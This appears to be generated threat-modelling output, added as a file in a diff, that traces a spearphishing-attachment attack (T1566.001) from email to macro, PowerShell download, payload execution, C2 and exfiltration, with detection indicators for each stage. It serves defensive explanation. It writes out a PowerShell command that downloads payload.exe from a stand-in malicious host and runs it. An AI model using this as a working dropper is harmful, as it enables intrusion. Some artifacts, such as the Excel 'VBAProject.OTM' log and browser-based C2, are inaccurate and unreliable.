@@ -1,0 +1,66 @@
+<output>
+Pattern Name: T1566.001 (Spearphishing Attachment)
+Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment that exploits a vulnerability in Microsoft Excel. The attack progresses from the initial email delivery to the execution of a payload, leveraging various applications such as Outlook, Excel, and a web browser for command and control (C2) communication.
+
+Attack Flow Breakdown:
+
+1. **Initial Access via Email**
+   - **Application Involved**: Outlook
+   - **User Action**: The user receives an email with a subject line "Important Update" and an attachment named "Invoice_2023.xlsx".
+   - **Key Artifacts**: Email headers, attachment file.
+   - **Detection Indicators**: 
+     - Unusual sender domain.
+     - Attachment with a double extension (e.g., .xlsx.exe).
+
+2. **Opening the Malicious Attachment**
+   - **Application Involved**: Microsoft Excel
+   - **User Action**: The user opens the attachment in Excel, which contains a macro designed to download and execute a payload.
+   - **Key Artifacts**: Excel file with macros enabled.
+   - **Detection Indicators**: 
+     - Execution of macros in Excel.
+     - Event logs showing macro execution (e.g., "VBAProject.OTM").
+
+3. **Macro Execution and Payload Download**
+   - **Application Involved**: PowerShell (child process of Excel)
+   - **User Action**: The macro executes a PowerShell command to download a malicious executable from a remote server.
+   - **Command Example**:
+     ```powershell
+     # Downloading the payload from a remote server
+     Invoke-WebRequest -Uri "http://malicious-server.com/payload.exe" -OutFile "$env:TEMP\payload.exe"
+     ```
+   - **Key Artifacts**: PowerShell command execution logs, downloaded executable in the TEMP directory.
+   - **Detection Indicators**: 
+     - PowerShell execution logs showing download activity.
+     - Network traffic to known malicious IP addresses.
+
+4. **Execution of the Malicious Payload**
+   - **Application Involved**: Windows Explorer (to execute the downloaded payload)
+   - **User Action**: The macro automatically executes the downloaded payload.
+   - **Command Example**:
+     ```shell
+     # Executing the downloaded payload
+     Start-Process "$env:TEMP\payload.exe"
+     ```
+   - **Key Artifacts**: Executable file in the TEMP directory, process creation logs.
+   - **Detection Indicators**: 
+     - Process creation logs showing execution of the payload.
+     - Anomalous behavior of the executable (e.g., network connections initiated).
+
+5. **Establishing Command and Control**
+   - **Application Involved**: Web Browser (e.g., Chrome)
+   - **User Action**: The payload connects to a C2 server to receive further instructions.
+   - **Network Indicators**: 
+     - Outbound connections to the C2 server (e.g., "http://malicious-server.com").
+   - **Detection Indicators**: 
+     - Network traffic analysis showing connections to known malicious domains.
+     - DNS queries for the C2 server.
+
+6. **Data Exfiltration or Lateral Movement**
+   - **Application Involved**: Various (could include PowerShell, RDP, etc.)
+   - **User Action**: The attacker may use the compromised system to exfiltrate data or move laterally within the network.
+   - **Key Artifacts**: Logs of file access, RDP connections.
+   - **Detection Indicators**: 
+     - Unusual file access patterns.
+     - RDP connections initiated from the compromised host.
+
+</output>
